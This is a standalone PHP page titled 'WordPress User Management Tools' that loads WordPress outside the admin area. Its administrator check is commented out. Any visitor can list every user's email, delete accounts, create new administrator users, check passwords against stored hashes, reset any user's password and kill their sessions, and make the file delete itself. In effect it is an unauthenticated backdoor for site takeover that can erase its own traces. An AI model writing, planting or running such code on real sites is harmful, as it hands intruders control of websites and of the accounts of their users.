<?php
require_once dirname(__FILE__) . '/wp-load.php';
if (!current_user_can('administrator')) {
    // wp_die('per not auth');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    global $wpdb;

	if (isset($_POST['action']) && $_POST['action'] === 'batch_delete' && !empty($_POST['user_ids']) && is_array($_POST['user_ids'])) {
		$deleted_count = 0;
        foreach ($_POST['user_ids'] as $userid) {
			if (!empty($userid)) {
				$wpdb->query('START TRANSACTION');
				$wpdb->delete($wpdb->users, ['ID' => $userid]);
				$wpdb->query('COMMIT');
				$deleted_count++;
			}
        }
        if ($deleted_count > 0) {
			echo "<p style='color:green'> <strong>{$deleted_count}</strong> users successfully deleted！</p>";
        }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'add_user') {
        $new_user = array(
            'user_login' => sanitize_user($_POST['new_username']),
            'user_pass' => $_POST['new_password'],
            'user_email' => sanitize_email($_POST['new_email']),
            'display_name' => sanitize_text_field($_POST['new_display_name']),
            'role' => sanitize_text_field('administrator')
        );

        $user_id = wp_insert_user($new_user);

        if (!is_wp_error($user_id)) {
            echo "<p style='color:green'>new user: <strong>{$new_user['user_login']}</strong> create success！ID: {$user_id}</p>";
        } else {
            echo "<p style='color:red'>create error：{$user_id->get_error_message()}</p>";
        }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'verify_password') {
        $username = sanitize_user($_POST['username']);
        $user = get_user_by('login', $username);
        $password = trim($_POST['password']);
        if ($user && wp_check_password($password, $user->user_pass, $user->ID)) {
            echo "<p style='color:green'>Password correct</p>";
        } else {
            echo "<p style='color:red'>Incorrect password</p>";
        }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'change_password') {
        $username = sanitize_user($_POST['username']);
        $new_password = $_POST['new_password'];
        $confirm_password = $_POST['confirm_password'];
        $message = '';
        if (empty($username) || empty($new_password)) {
            $message = '<p style="color:red;">The username and new password cannot be empty!</p>';
        } elseif ($new_password !== $confirm_password) {
            $message = '<p style="color:red;">The two passwords do not match!</p>';
        } else {
            $user = get_user_by('login', $username);
            if (!$user) {
                $message = '<p style="color:red;">User <strong>' . $username . '</strong> It doesnt exist!</p>';
            } else {
				$hashed_password = wp_hash_password($new_password);
				$result = $wpdb->update(
					$wpdb->users,
					array('user_pass' => $hashed_password),
					array('ID' => $user->ID),
					array('%s'),
					array('%d')
				);
                if ($result !== false) {
					$wpdb->delete($wpdb->usermeta, array('user_id' => $user->ID, 'meta_key' => 'session_tokens'));
                    $message = '<p style="color:green;">✓ User <strong>' . $username . '</strong> Your password has been successfully changed!</p>';
                } else {
                    $message = '<p style="color:red;">Password change failed, please try again later.</p>';
                }
            }
        }
        if ($message) echo '<div style="padding: 15px; margin: 20px 0; border-radius: 5px;">' . $message . '</div>';
    }

	if (isset($_POST['action']) && $_POST['action'] === 'del_itself') {
		$self_file = __FILE__;
		if (file_exists($self_file)) {
			$deleted = @unlink($self_file);
			if ($deleted) {
				echo "<p style='color:green; font-weight:bold;'>✓ Successfully deleted itself!</p>";
			} else {
				register_shutdown_function(function() use ($self_file) {
					if (file_exists($self_file)) {
						@unlink($self_file);
						echo "<p style='color:orange;'>It has been deleted at the end of the script.</p>";
					}
				});
				echo "<p style='color:orange;'>The file cannot be deleted immediately; it will attempt to delete it when the script ends.</p>";
			}
		}else {
			echo "<p style='color:red;'>The file does not exist and cannot be deleted.</p>";
		}
	}
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WordPress User Management Tools</title>
    <style>
        body {
            font-family: Arial;
            margin: 40px;
        }

        table {
            border-collapse: collapse;
            width: 100%;
            margin: 20px 0;
        }

        th, td {
            border: 1px solid #ccc;
            padding: 8px;
            text-align: left;
        }

        th {
            background: #f0f0f0;
        }
    </style>
</head>
<body>
<h1>WordPress User Management Tools</h1>

<h2>1）Batch delete selected users</h2>
<?php
$users = get_users(['orderby' => 'ID', 'order' => 'ASC']);
?>
<form method="post" id="user-bulk-form" onsubmit="return confirm('Are you sure you want to delete the selected users? This operation is irreversible!');">
<input type="hidden" name="action" value="batch_delete">
<table>
    <tr>
		<th><input type="checkbox" id="select-all"></th>
        <th>ID</th>
        <th>Username</th>
        <th>nickname</th>
        <th>email</th>
        <th>role</th>
        <th>created_at</th>
    </tr>
    <?php foreach ($users as $user): ?>
        <tr>
			<td>
				<input type="checkbox" name="user_ids[]" value="<?php echo $user->ID; ?>" class="user-checkbox">
			</td>
            <td><?php echo $user->ID; ?></td>
            <td><?php echo esc_html($user->user_login); ?></td>
            <td><?php echo esc_html($user->display_name); ?></td>
            <td><?php echo esc_html($user->user_email); ?></td>
            <td><?php echo implode(', ', $user->roles); ?></td>
            <td><?php echo $user->user_registered; ?></td>
        </tr>
    <?php endforeach; ?>
</table>
<div style="margin: 20px 0;">
	<button type="submit" style="padding:10px 20px; background:#d63638; color:white; border:none; border-radius:4px;">
		Batch delete selected users
	</button>
	<input type="hidden" name="action" value="batch_delete">
</div>
</form>
<script>
document.getElementById('select-all').addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('.user-checkbox');
    checkboxes.forEach(cb => cb.checked = this.checked);
});
</script>


<hr><h2>2）Add New User</h2>
<form method="post">
    <input type="hidden" name="action" value="add_user">
    <p>Username：<input type="text" name="new_username" required></p>
    <p>password：<input type="password" name="new_password" required></p>
    <p>email：<input type="email" name="new_email" required></p>
    <p>nickname：<input type="text" name="new_display_name"></p>
    <button type="submit">Create a new user</button>
</form>

<hr><h1>3）User password verification tool</h1>
<form method="post">
    <input type="hidden" name="action" value="verify_password">
    <p>
        <label>Username：</label><br>
        <input type="text" name="username" required style="width:300px;">
    </p>
    <p>
        <label>password：</label><br>
        <input type="password" name="password" required style="width:300px;">
    </p>
    <button type="submit">Verify password</button>
</form>

<hr><h1>4）Change user password</h1>
<form method="post">
    <input type="hidden" name="action" value="change_password">
    <p>
        <label><strong>Username：</strong></label><br>
        <input type="text" name="username" required placeholder="Please enter your username.">
    </p>
    <p>
        <label><strong>New Password：</strong></label><br>
        <input type="password" name="new_password" required placeholder="Please enter your new password">
    </p>
    <p>
        <label><strong>Confirm new password：</strong></label><br>
        <input type="password" name="confirm_password" required placeholder="Please enter your new password again.">
    </p>
    <button type="submit" style="padding:10px 20px; font-size:16px;">Confirm password change</button>
</form>

<hr><h1>5）Delete itself</h1>
<form method="post">
    <input type="hidden" name="action" value="del_itself">
    <button type="submit" style="padding:10px 20px; font-size:16px;">Confirm Delete</button>
</form>

</body>
</html>
